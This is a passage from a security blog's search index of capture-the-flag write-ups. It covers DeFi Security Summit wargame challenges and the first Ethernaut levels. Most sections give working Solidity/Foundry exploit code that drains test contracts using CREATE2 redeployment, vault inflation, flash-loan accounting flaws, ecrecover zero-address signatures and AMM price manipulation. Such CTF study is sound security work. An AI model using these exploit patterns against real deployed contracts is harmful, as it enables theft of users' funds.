Rescue the Ether \ud83e\uddd7\ud83e\udded"},{"location":"wargames/defi_security_summit/#exploit_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 /*//////////////////////////////////////////////////////////// // DEFINE ANY NECESSARY CONTRACTS HERE // // If you need a contract for your hack, define it below // ////////////////////////////////////////////////////////////*/ contract Executor { ModernWETH mWETH ; address owner = msg . sender ; constructor ( address _mWETH ) { mWETH = ModernWETH ( _mWETH ); } function execute () external { mWETH . withdrawAll (); } receive () external payable { mWETH . transfer ( owner , mWETH . balanceOf ( address ( this ))); payable ( owner ). transfer ( address ( this ). balance ); } } /*//////////////////////////////////////////////////////////// // TEST CONTRACT // ////////////////////////////////////////////////////////////*/ contract Challenge2Test is Test { ModernWETH public modernWETH ; address public whitehat = makeAddr ( \"whitehat\" ); function setUp () public { modernWETH = new ModernWETH (); /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it address whale = makeAddr ( \"whale\" ); vm . deal ( whale , 1000 ether ); vm . prank ( whale ); modernWETH . deposit { value : 1000 ether }(); /// @dev you, the whitehat, start with 10 ether vm . deal ( whitehat , 10 ether ); } function testWhitehatRescue () public { vm . startPrank ( whitehat , whitehat ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge2Test -vvvv // ////////////////////////////////////////////////////*/ Executor executor = new Executor ( address ( modernWETH )); uint256 amount ; while ( address ( modernWETH ). balance > 0 ) { amount = address ( modernWETH ). balance < whitehat . balance ? address ( modernWETH ). balance : whitehat . balance ; modernWETH . deposit { value : amount }(); modernWETH . transfer ( address ( executor ), amount ); executor . execute (); modernWETH . withdrawAll (); } //==================================================// vm . stopPrank (); assertEq ( address ( modernWETH ). balance , 0 , \"ModernWETH balance should be 0\" ); // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue assertEq ( address ( whitehat ). balance , 1010 ether , \"whitehat should end with 1010 ether\" ); } }","title":"Exploit"},{"location":"wargames/defi_security_summit/#3-lendex-pool-hack","text":"You have to fill the shoes of the hacker and execute the exploit by stealing stablecoins from a lending pool. Note Foundry has a bug. If a selfdestruct() is triggered in a test script then it has to be done in the setUp() function and the rest of the code should be in a different function otherwise foundry test script does not see that selfdestruct happened to a contract. hacker \u901a\u8fc7 CreateDeployer \u90e8\u7f72\u4e86 LendingPool \uff0c\u800c CreateDeployer \u7531 Create2Deployer \u90e8\u7f72 1 2 3 4 5 vm . startPrank ( hacker ); create2Deployer = new Create2Deployer (); createDeployer = CreateDeployer ( create2Deployer . deploy ()); lendingPool = LendingPool ( createDeployer . deploy ( true , address ( usdc ))); vm . stopPrank (); CreateDeployer \u4ee5\u53ca LendingPool \u7684 owner \u53ef\u4ee5\u8ba9\u5408\u7ea6\u81ea\u6bc1 CREATE \u6839\u636e sender \u548c nonce \u8ba1\u7b97\u90e8\u7f72\u5408\u7ea6\u7684\u5730\u5740\uff0c CreateDeployer \u81ea\u6bc1\u540e\uff0c nonce \u88ab\u91cd\u7f6e\uff0c\u800c CreateDeployer \u7531 CREATE2 \u521b\u5efa\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728\u540c\u4e00\u5730\u5740\u4e0a\u90e8\u7f72\u4e0d\u540c\u7684\u5408\u7ea6 LendingPool \u6240\u5728\u5730\u5740\u6301\u6709\u7684 USDC \u4e0d\u53d7\u81ea\u6bc1\u7684\u5f71\u54cd","title":"3. LendEx pool hack \ud83e\udd3a\ud83c\udccf"},{"location":"wargames/defi_security_summit/#exploit_2","text":"LendingHack.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 contract LendingHack is Ownable { /*////////////////////////////// // Add your hack below! // //////////////////////////////*/ string public constant name = \"LendingPool hack\" ; /** * @dev Constructor that sets the owner of the contract * @param _usdc The address of the USDC contract to use * @param _owner The address of the owner of the contract */ constructor ( address _owner , address _usdc ) { USDC usdc = USDC ( _usdc ); usdc . transfer ( _owner , usdc . balanceOf ( address ( this ))); } //============================// } Challenge3.t.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 contract Challenge3Test is Test { USDC public usdc ; uint256 public usdcAmount = 100000 ; LendExGovernor public lendExGovernor ; CreateDeployer public createDeployer ; Create2Deployer public create2Deployer ; LendingPool public lendingPool ; LendingHack public lendingHack ; address public hacker = makeAddr ( \"hacker\" ); address public governanceOwner = makeAddr ( \"governanceOwner\" ); function setUp () public { /* set up actions */ usdc = new USDC ( usdcAmount ); usdc . transfer ( governanceOwner , usdcAmount ); /* sending transactions as hacker */ // deploying the LendingPool contract vm . startPrank ( hacker ); create2Deployer = new Create2Deployer (); createDeployer = CreateDeployer ( create2Deployer . deploy ()); lendingPool = LendingPool ( createDeployer . deploy ( true , address ( usdc ))); vm . stopPrank (); /* sending transactions as the governance owner */ // deploying the LendingPool contract vm . startPrank ( governanceOwner ); lendExGovernor = new LendExGovernor ( address ( usdc )); lendExGovernor . addContract ( address ( lendingPool )); usdc . transfer ( address ( lendExGovernor ), usdcAmount ); // funding the LendingPool contract with USDC lendExGovernor . fundLendingPool ( address ( lendingPool ), usdcAmount ); vm . stopPrank (); assertEq ( lendExGovernor . getPoolName ( address ( lendingPool )), \"LendingPool V1\" , \"lendingPool contract has the original name\" ); vm . startPrank ( hacker ); /*////////////////////////////////////////////////////////////////////// // Add your hack below! // // Hack part #1 // // NOTE!!! Foundry has a bug // // anything selfdestruct() related has to be in the setUp() function // // // // terminal command to run the speciffic test: // // forge test --match-contract Challenge3Test -vvvv // //////////////////////////////////////////////////////////////////////*/ lendingPool . emergencyStop (); createDeployer . cleanUp (); //====================================================================// vm . stopPrank (); } function testExploit () public { vm . startPrank ( hacker ); /*////////////////////////////////////////////////////////////// // Add your hack below! // // Hack part #2 // // Please implement necessary changes also to LendingHack.sol // // terminal command to run the specific test: // // forge test --match-contract Challenge3Test -vvvv // //////////////////////////////////////////////////////////////*/ createDeployer = CreateDeployer ( create2Deployer . deploy ()); lendingHack = LendingHack ( createDeployer . deploy ( false , address ( usdc ))); //=============================================================// vm . stopPrank (); assertEq ( lendExGovernor . getPoolName ( address ( lendingPool )), \"LendingPool hack\" , \"lendingPool contract address now gives a different name\" ); assertEq ( usdc . balanceOf ( hacker ), usdcAmount , \"Hacker has to steal all the stablecoin tokens\" ); } }","title":"Exploit"},{"location":"wargames/defi_security_summit/#references","text":"Deploy Different Contracts at the Same Address | Solidity by Example","title":"References"},{"location":"wargames/defi_security_summit/#4-operation-rescue-posi-token","text":"Extract the 1000 POSI tokens from the Vault. Transfer the rescued tokens to the address of the organization. VaultFactory \u4f7f\u7528 CREATE2 \u90e8\u7f72\u5408\u7ea6\uff0c\u6839\u636e\u90e8\u7f72\u5b57\u8282\u7801\u548c\u76d0\u503c\u53ef\u4ee5\u786e\u5b9a\u5408\u7ea6\u90e8\u7f72\u7684\u5730\u5740 The only thing that we know is that he used to work with us in the past, that his birthday was in November and that he was a big fan of the CREATE2 opcode. \u6839\u636e\u63d0\u793a\u53ef\u4ee5\u786e\u5b9a salt \u4e3a 11","title":"4. Operation Rescue POSI Token \ud83d\udcbc\ud83d\udd13"},{"location":"wargames/defi_security_summit/#exploit_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 contract Challenge4Test is Test { VaultFactory public FACTORY ; PosiCoin public POSI ; address public unclaimedAddress = 0x70E194050d9c9c949b3061CC7cF89dF9c6782b7F ; address public whitehat = makeAddr ( \"whitehat\" ); address public devs = makeAddr ( \"devs\" ); function setUp () public { vm . label ( unclaimedAddress , \"Unclaimed Address\" ); // Instantiate the Factory FACTORY = new VaultFactory (); // Instantiate the POSICoin POSI = new PosiCoin (); // OOPS transferred to the wrong address! POSI . transfer ( unclaimedAddress , 1000 ether ); } function testWhitehatRescue () public { vm . deal ( whitehat , 10 ether ); vm . startPrank ( whitehat , whitehat ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge4Test -vvvv // ////////////////////////////////////////////////////*/ VaultWalletTemplate wallet = VaultWalletTemplate ( payable ( FACTORY . deploy ( type ( VaultWalletTemplate ). creationCode , 11 ))); wallet . initialize ( whitehat ); wallet . withdrawERC20 ( address ( POSI ), 1000 ether , devs ); //==================================================// vm . stopPrank (); assertEq ( POSI . balanceOf ( devs ), 1000 ether , \"devs' POSI balance should be 1000 POSI\" ); } }","title":"Exploit"},{"location":"wargames/defi_security_summit/#5-balloon-vault","text":"Drain Bob's wallet and Alice's wallet End up with more than 1000 ETH in your wallet BallonVault \u6709\u8f6c\u79fb Bob \u548c Alice \u6301\u6709 WETH \u7684\u8bb8\u53ef 1 2 3 4 vm . prank ( bob ); weth . approve ( address ( vault ), 500 ether ); vm . prank ( alice ); weth . approve ( address ( vault ), 500 ether ); WETH \u6ca1\u6709\u51fd\u6570 permit() \uff0c\u56e0\u6b64\u8c03\u7528 depositWithPermit() \u4e0d\u4f1a\u5bf9\u7b7e\u540d\u8fdb\u884c\u6821\u9a8c 1 2 3 4 5 6 7 function depositWithPermit ( address from , uint256 amount , uint256 deadline , uint8 v , bytes32 r , bytes32 s ) external { IERC20Permit ( address ( asset ())). permit ( from , address ( this ), amount , deadline , v , r , s ); _deposit ( from , from , amount , previewDeposit ( amount )); } attacker \u6ca1\u6709\u8f6c\u79fb Bob \u6216 Alice \u6301\u6709 Shares \u7684\u8bb8\u53ef\uff0c\u901a\u8fc7\u901a\u8d27\u81a8\u80c0\u653b\u51fb\uff0c\u4f7f Bob \u6216 Alice \u7684 deposit \u65e0\u6cd5\u83b7\u5f97 Shares\uff0c\u4ece\u800c\u5728 redeem \u65f6\u83b7\u5f97\u66f4\u591a\u7684 WETH","title":"5. Balloon Vault \ud83c\udf88\ud83c\udf88"},{"location":"wargames/defi_security_summit/#exploit_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 contract Challenge5Test is Test { BallonVault public vault ; WETH public weth = new WETH (); address public attacker = makeAddr ( \"attacker\" ); address public bob = makeAddr ( \"bob\" ); address public alice = makeAddr ( \"alice\" ); function setUp () public { vault = new BallonVault ( address ( weth )); // Attacker starts with 10 ether vm . deal ( address ( attacker ), 10 ether ); // Set up Bob and Alice with 500 WETH each weth . deposit { value : 1000 ether }(); weth . transfer ( bob , 500 ether ); weth . transfer ( alice , 500 ether ); vm . prank ( bob ); weth . approve ( address ( vault ), 500 ether ); vm . prank ( alice ); weth . approve ( address ( vault ), 500 ether ); } function _inflation_attack ( address victim ) internal { vault . deposit ( 1 , attacker ); weth . transfer ( address ( vault ), weth . balanceOf ( attacker )); uint256 amount = weth . balanceOf ( address ( vault )) - 1 ; vault . depositWithPermit ( victim , amount > weth . balanceOf ( victim ) ? weth . balanceOf ( victim ) : amount , 0 , 0 , bytes32 ( 0 ), bytes32 ( 0 ) ); vault . redeem ( 1 , attacker , attacker ); } function testExploit () public { vm . startPrank ( attacker ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge5Test -vvvv // ////////////////////////////////////////////////////*/ weth . deposit { value : 10 ether }(); weth . approve ( address ( vault ), type ( uint256 ). max ); while ( weth . balanceOf ( alice ) > 0 ) { _inflation_attack ( alice ); } _inflation_attack ( bob ); // the attacker now has enough weth to steal from Bob in a single step //==================================================// vm . stopPrank (); assertGt ( weth . balanceOf ( address ( attacker )), 1000 ether , \"Attacker should have more than 1000 ether\" ); } }","title":"Exploit"},{"location":"wargames/defi_security_summit/#6-safe-yield","text":"Drain at least 100 ETH from the yield pool. flashLoan() \u5728\u5b8c\u6210 onFlashLoan() \u7684\u8c03\u7528\u540e\u53ea\u68c0\u67e5\u5408\u7ea6\u4e2d\u5bf9\u5e94\u8d44\u4ea7\u7684\u4f59\u989d\uff0c\u53ef\u5728\u56de\u8c03\u51fd\u6570\u4e2d\u901a\u8fc7 addLiquidity() \u3001 ethToToken() \u6216 tokenToEth() \u8fdb\u884c\u8f6c\u6362 1 2 3 4 5 6 if ( token == ETH ) { require ( address ( this ). balance >= expected , \"Flash loan not repayed\" ); } else { require ( getReserve () >= expected , \"Flash loan not repayed\" ); }","title":"6. Safe Yield? \ud83c\udfe6\ud83d\udcc8"},{"location":"wargames/defi_security_summit/#exploit_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 contract Hack is IERC3156FlashBorrower { YieldPool pool ; SecureumToken token ; address payable owner = payable ( msg . sender ); constructor ( YieldPool _pool , SecureumToken _token ) payable { pool = _pool ; token = _token ; } function exploit () external { token . approve ( address ( pool ), type ( uint256 ). max ); while ( address ( this ). balance < 100 ether ) { if ( address ( this ). balance > 0 ) { pool . flashLoan ( IERC3156FlashBorrower ( address ( this )), pool . ETH (), address ( this ). balance * 100 , \"\" ); } else { pool . flashLoan ( IERC3156FlashBorrower ( address ( this )), address ( token ), token . balanceOf ( address ( this )) * 100 , \"\" ); } } } function withdraw () external { require ( msg . sender == owner ); pool . tokenToEth ( token . balanceOf ( address ( this ))); owner . transfer ( address ( this ). balance ); } function onFlashLoan ( address , address _token , uint256 amount , uint256 , bytes calldata ) external returns ( bytes32 ) { require ( msg . sender == address ( pool )); if ( _token == address ( token )) { pool . tokenToEth ( token . balanceOf ( address ( this ))); } else { pool . ethToToken { value : address ( this ). balance }(); } return keccak256 ( \"ERC3156FlashBorrower.onFlashLoan\" ); } receive () external payable {} } /*//////////////////////////////////////////////////////////// // TEST CONTRACT // ////////////////////////////////////////////////////////////*/ contract Challenge6Test is Test { SecureumToken public token ; YieldPool public yieldPool ; address public attacker = makeAddr ( \"attacker\" ); address public owner = makeAddr ( \"owner\" ); function setUp () public { // setup pool with 10_000 ETH and ST tokens uint256 start_liq = 10 _000 ether ; vm . deal ( address ( owner ), start_liq ); vm . prank ( owner ); token = new SecureumToken ( start_liq ); yieldPool = new YieldPool ( token ); vm . prank ( owner ); token . increaseAllowance ( address ( yieldPool ), start_liq ); vm . prank ( owner ); yieldPool . addLiquidity { value : start_liq }( start_liq ); // attacker starts with 0.1 ether vm . deal ( address ( attacker ), 0.1 ether ); } function testExploitPool () public { vm . startPrank ( attacker ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge6Test -vvvv // ////////////////////////////////////////////////////*/ Hack hack = new Hack { value : 0.1 ether }( yieldPool , token ); hack . exploit (); hack . withdraw (); //==================================================// vm . stopPrank (); assertGt ( address ( attacker ). balance , 100 ether , \"hacker should have more than 100 ether\" ); } }","title":"Exploit"},{"location":"wargames/defi_security_summit/#7-crystal-dao","text":"Rescue 100 ETH from the DAO treasury. DaoVaultImplementation \u7ee7\u627f\u4e86 Initializable \u548c EIP712Upgradeable \uff0c\u56e0\u6b64 slot 0 \u4e0d\u5bf9\u5e94\u72b6\u6001\u53d8\u91cf owner \uff0c\u5728\u8c03\u7528 initialize() \u540e owner \u4ecd\u4e3a\u9ed8\u8ba4\u503c address(0) 1 2 3 4 5 6 7 8 9 function initialize ( address _owner ) public initializer { // EIP712 init: name DaoWallet, version 1.0 __EIP712_init ( \"DaoWallet\" , \"1.0\" ); // postInit: set owner with gas optimizations assembly { sstore ( 0 , _owner ) } } \u7531\u4e8e\u672a\u8fdb\u884c\u96f6\u5730\u5740\u68c0\u67e5\uff0c\u65e0\u6548\u7b7e\u540d\u53ef\u901a\u8fc7\u6821\u9a8c 1 2 address signer = ecrecover ( hash , v , r , s ); require ( owner == signer , \"Only owner can execute!\" );","title":"7. Crystal DAO \ud83d\udc8e\ud83d\udc8e"},{"location":"wargames/defi_security_summit/#exploit_6","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 contract Challenge7Test is Test { FactoryDao factory ; address public whitehat = makeAddr ( \"whitehat\" ); address public daoManager ; uint256 daoManagerKey ; IDaoVault vault ; function setUp () public { ( daoManager , daoManagerKey ) = makeAddrAndKey ( \"daoManager\" ); factory = new FactoryDao (); vm . prank ( daoManager ); vault = IDaoVault ( factory . newWallet ()); // The vault has reached 100 ether in donations deal ( address ( vault ), 100 ether ); } function testHack () public { vm . startPrank ( whitehat , whitehat ); /*//////////////////////////////////////////////////// // Add your hack below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge7Test -vvvv // ////////////////////////////////////////////////////*/ vault . execWithSignature ( 0 , bytes32 ( 0 ), bytes32 ( 0 ), daoManager , 100 ether , \"\" , block . timestamp + 1 ); //==================================================// vm . stopPrank (); assertEq ( daoManager . balance , 100 ether , \"The Dao manager's balance should be 100 ether\" ); } }","title":"Exploit"},{"location":"wargames/defi_security_summit/#8-liquidatoooor","text":"Drop the borrower's health account. Liquidate the borrower and get as much of his collateral as possible. token0 (TKN) \u7684\u4ef7\u683c\u80fd\u591f\u5f71\u54cd\u5065\u5eb7\u7cfb\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function healthFactor ( address _user ) public returns ( uint256 ) { if ( users [ _user ]. borrow == 0 ) { // User has not borrowed any tokens, so health is theoretically infinite return type ( uint256 ). max ; } uint256 collateralValue = users [ _user ]. collateral * getPriceToken (); uint256 borrowValue = users [ _user ]. borrow ; uint256 hf = collateralValue * CF / borrowValue ; // Includes 2 decimals return hf ; } function getPriceToken () public returns ( uint256 ) { return amm . getPriceToken0 (); } \u7531\u4e8e\u4f7f\u7528\u7684\u662f\u5b9e\u65f6\u4ef7\u683c\uff0c\u901a\u8fc7 swap() \u964d\u4f4e token0 \u7684\u4ef7\u683c\uff0c\u4ee5\u964d\u4f4e\u5065\u5eb7\u7cfb\u6570\u5e76\u6e05\u7b97\u539f\u5148\u5065\u5eb7\u7684\u8d26\u6237 1 2 3 function getPriceToken0 () public view returns ( uint256 ) { return ( reserve1 * 1e18 ) / reserve0 ; }","title":"8. Liquidatoooor \ud83d\udd31\ud83d\udd31"},{"location":"wargames/defi_security_summit/#exploit_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 contract Challenge8Test is Test { Oiler public oiler ; AMM public amm ; ERC20 token ; ERC20 dai ; address player ; address superman ; function setUp () public { /** * @notice Create ERC20 tokens */ token = new ERC20 ( \"Token\" , \"TKN\" ); dai = new ERC20 ( \"DAI token\" , \"DAI\" ); vm . label ( address ( token ), \"TKN\" ); vm . label ( address ( dai ), \"DAI\" ); /** * @notice Deploy contant prodcut AMM with a TOKEN <> DAI pair */ amm = new AMM ( address ( token ), address ( dai )); vm . label ( address ( amm ), \"amm\" ); /** * @notice Deploy Lending contract. Accepts 'TOKEN' as collateral and * mints a 'dTOKEN' underlying debt token. */ oiler = new Oiler ( address ( token ), address ( amm )); vm . label ( address ( oiler ), \"oiler\" ); /** * @notice Create 2 accounts and fund them. * - Player starts with 100 TOKEN and 100 DAI * - Superman starts with 200 TOKEN and 200 DAI, * Superman adds 100 of each to the pool. */ player = makeAddr ( \"player\" ); superman = makeAddr ( \"Super-man\" ); deal ( address ( token ), player , 100 ); deal ( address ( dai ), player , 100 ); deal ( address ( token ), superman , 200 ); deal ( address ( dai ), superman , 200 ); /** * @notice Add liquidity to AMM pair. */ vm . startPrank ( superman ); token . approve ( address ( amm ), type ( uint256 ). max ); dai . approve ( address ( amm ), type ( uint256 ). max ); amm . addLiquidity ( 100 , 100 ); vm . stopPrank (); } function testSolution () public { // Victim set up vm . startPrank ( superman ); token . approve ( address ( oiler ), 100 ); oiler . deposit ( 100 ); oiler . maxBorrow ( superman ); // Always account for 2 Decimal places oiler . borrow ( 75 ); oiler . healthFactor ( superman ); vm . stopPrank (); // Player initial balance is of 100 $TOKEN and 100 $DAI console . log ( \"Initial token balance: \" , token . balanceOf ( player )); console . log ( \"Initial dai balance: \" , dai . balanceOf ( player )); vm . startPrank ( player ); /*//////////////////////////////////////////////////// // Add your attack logic below! // // // // terminal command to run the specific test: // // forge test --match-contract Challenge8Test -vvvv // ////////////////////////////////////////////////////*/ token . approve ( address ( oiler ), 4 ); oiler . deposit ( 4 ); oiler . borrow ( 3 ); // for repayment token . approve ( address ( amm ), 96 ); amm . swap ( address ( token ), 96 ); oiler . liquidate ( superman ); dai . approve ( address ( amm ), dai . balanceOf ( player )); amm . swap ( address ( dai ), dai . balanceOf ( player )); //==================================================// vm . stopPrank (); // Conditions to pass: // - Player has liquidated the victim // - Player has more than 150 $TOKENs // - Extra: Player has more than 200 $TOKENs Oiler . User memory victim = oiler . getUserData ( superman ); assertEq ( victim . liquidated , true ); assert ( token . balanceOf ( player ) > 200 ); } }","title":"Exploit"},{"location":"wargames/ethernaut/","tags":["blockchain","smart contract","solidity","metamask","remix","web3"],"text":"#blockchain #smart contract #solidity #metamask #remix #web3 .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } 0. Hello Ethernaut \u00b6 \u767b\u5f55 MetaMask\uff0c\u5c06 MetaMask \u5207\u6362\u5230 Goerli \u6d4b\u8bd5\u7f51\u7edc \u82e5\u6ca1\u6709\u5219\u9700\u8981\u5728 \u8bbe\u7f6e->\u9ad8\u7ea7 \u4e2d\u5f00\u542f\u300cShow test networks\u300d \u5728\u6d4f\u89c8\u5668\u7684\u63a7\u5236\u53f0\u53ef\u4ee5\u6536\u5230\u4e00\u4e9b\u6d88\u606f\uff0c\u5176\u4e2d\u4e00\u6761\u4e3a\u73a9\u5bb6\u5730\u5740 \u53ef\u4ee5\u4f7f\u7528 player \u547d\u4ee4\u968f\u65f6\u67e5\u770b\u73a9\u5bb6\u5730\u5740\uff0cMetaMask \u4e5f\u53ef\u4ee5\u76f4\u63a5\u590d\u5236 \u67e5\u770b\u5f53\u524d\u4f59\u989d\uff1a getBalance(player) \u5982\u679c\u663e\u793a pending \uff0c\u53ef\u6539\u7528 await getBalance(player) \u6765\u83b7\u5f97\u6e05\u6670\u7684\u7ed3\u679c 1 2 >> await getBalance ( player ) \"0\" \u5728\u63a7\u5236\u53f0\u8f93\u5165 ethernaut \u67e5\u770b\u6e38\u620f\u7684\u4e3b\u8981\u5408\u7ea6 \u5408\u7ea6\u7684 ABI\uff08Application Binary Interfaces\uff09\u63d0\u4f9b\u4e86\u6240\u6709 Ethernaut.sol \u7684\u516c\u5f00\u65b9\u6cd5\uff0c\u5982\u6240\u6709\u8005\uff0c\u53ef\u901a\u8fc7 ethernaut.owner() \u67e5\u770b \u5e76\u4e0d\u9700\u8981\u76f4\u63a5\u4e0e Ethernaut.sol \u5408\u7ea6\u4ea4\u4e92\uff0c\u800c\u662f\u901a\u8fc7\u5173\u5361\u5b9e\u4f8b \u83b7\u53d6\u6d4b\u8bd5\u7528\u4ee5\u592a\u5e01\u7528\u4e8e\u652f\u4ed8\u6c7d\u6cb9\u8d39\uff1a 1 / 2 / 3 / 4 \u70b9\u51fb\u300cGet new instance\u300d\u5e76\u5728 MetaMask \u6388\u6743\u4ea4\u6613 \u67e5\u770b\u5408\u7ea6\u4fe1\u606f\u5e76\u6839\u636e\u63d0\u793a\u4ea4\u4e92 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 >> await contract . info () \"You will find what you need in info1().\" >> await contract . info1 () \"Try info2(), but with \\\"hello\\\" as a parameter.\" >> await contract . info2 ( \"hello\" ) \"The property infoNum holds the number of the next info method to call.\" >> await contract . infoNum () { \"negative\" : 0 , \"words\" : [ 42 , null ], \"length\" : 1 , \"red\" : null } >> await contract . info42 () \"theMethodName is the name of the next method.\" >> await contract . theMethodName () \"The method name is method7123949.\" >> await contract . method7123949 () \"If you know the password, submit it to authenticate().\" >> await contract . password () \"ethernaut0\" >> await contract . authenticate ( \"ethernaut0\" ) // MetaMask \u6388\u6743\u4ea4\u6613\uff0c\u7b49\u5f85\u786e\u8ba4 >> await contract . getCleared () true \u67e5\u770b\u5408\u7ea6\u6240\u6709 ABI\uff1a contract.abi \u5b8c\u6210\u540e\u70b9\u51fb\u300cSubmit instance\u300d\u9a8c\u8bc1 1. Fallback \u00b6 \u9605\u8bfb\u5408\u7ea6\u4ee3\u7801\u5e76\u8fbe\u6210\u4ee5\u4e0b\u76ee\u6807\uff1a \u83b7\u5f97\u5408\u7ea6\u7684\u6240\u6709\u6743 \u5c06\u5176\u4f59\u989d\u51cf\u4e3a 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; // Arithmetic operations revert on underflow and overflow // no need to use SafeMath after v0.8.0 contract Fallback { mapping ( address => uint ) public contributions ; address public owner ; constructor () { // \u6784\u9020\u51fd\u6570 owner = msg . sender ; // \u6240\u6709\u8005\u4e3a\u5f53\u524d\u8c03\u7528 contributions [ msg . sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg . sender == owner , \"caller is not the owner\" ); _ ; // only used inside a function modifier and it tells Solidity to execute the rest of the code. } function contribute () public payable { // msg.value - \u968f\u6d88\u606f\u53d1\u9001\u7684 wei \u7684\u6570\u91cf require ( msg . value < 0.001 ether ); contributions [ msg . sender ] += msg . value ; // \u6bcf\u6b21\u8f6c\u8d26\u4e0d\u80fd\u8d85\u8fc7 0.001 \u4ee5\u592a\u5e01\uff0c\u60f3\u8981\u8d85\u8fc7\u539f owner \u7684 1000 \u4ee5\u592a\u5e01 // \u9700\u8981\u91cd\u590d\u8c03\u7528\u591a\u6b21 contribute \u51fd\u6570\uff0c\u4e14\u6d4b\u8bd5\u8d26\u6237\u4e5f\u6ca1\u6709\u90a3\u4e48\u591a\u4ee5\u592a\u5e01\uff0c\u663e\u7136\u4e0d\u592a\u73b0\u5b9e if ( contributions [ msg . sender ] > contributions [ owner ]) { owner = msg . sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg . sender ]; } function withdraw () public onlyOwner { payable ( owner ). transfer ( address ( this ). balance ); // \u5408\u7ea6\u6240\u6709\u8005\u624d\u80fd\u5c06\u8d26\u6237\u4f59\u989d\u6e05\u96f6 } // \u4e00\u4e2a\u5408\u7ea6\u6700\u591a\u80fd\u6709\u4e00\u4e2a receive \u51fd\u6570\uff0c\u4e0d\u80fd\u6709\u53c2\u6570\u548c\u8fd4\u56de\u503c // \u5fc5\u987b\u58f0\u660e external \u548c payable // \u5f53\u8c03\u7528\u5408\u7ea6\u7684 data \u57df\u4e3a\u7a7a\u65f6\uff0c\u5c06\u4f1a\u6267\u884c\uff1b\u5982\u679c\u6ca1\u6709 receive \u51fd\u6570\uff0c\u5c06\u5c1d\u8bd5 fallback \u51fd\u6570 receive () external payable { require ( msg . value > 0 && contributions [ msg . sender ] > 0 ); owner = msg . sender ; } } \u6ce8\u610f\u5230\u82e5\u5f53\u524d\u4ea4\u6613\u8f6c\u8d26\u91d1\u989d\u5927\u4e8e 0 \u4e14\u8c03\u7528\u8005\u8d21\u732e\u4e0d\u4e3a 0 \u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 receive \u51fd\u6570\u53d6\u5f97\u5408\u7ea6\u6240\u6709\u6743 \u9996\u5148\u901a\u8fc7 contribute \u4f7f\u8d21\u732e\u503c\u5927\u4e8e 0 1 >> await contract . contribute ({ value : 1 }) \u5411\u5408\u7ea6\u8f6c\u8d26\u89e6\u53d1 receive \u51fd\u6570\uff0c\u6267\u884c\u5b8c\u6210\u540e\u786e\u8ba4\u4e00\u4e0b\u6240\u6709\u8005 1 2 3 4 5 >> await contract . send ( 1 ) // \u6216 >> await contract . sendTransaction ({ value : 1 }) // \u53d1\u8d77\u4e00\u4e2a\u4ea4\u6613 >> await contract . owner () \u6e05\u7a7a\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d 1 >> await contract . withdraw () \u53c2\u8003\u8d44\u6599 \u00b6 Receive Ether Function sendTransaction 2. Fallout \u00b6 \u58f0\u660e\u5408\u7ea6\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import 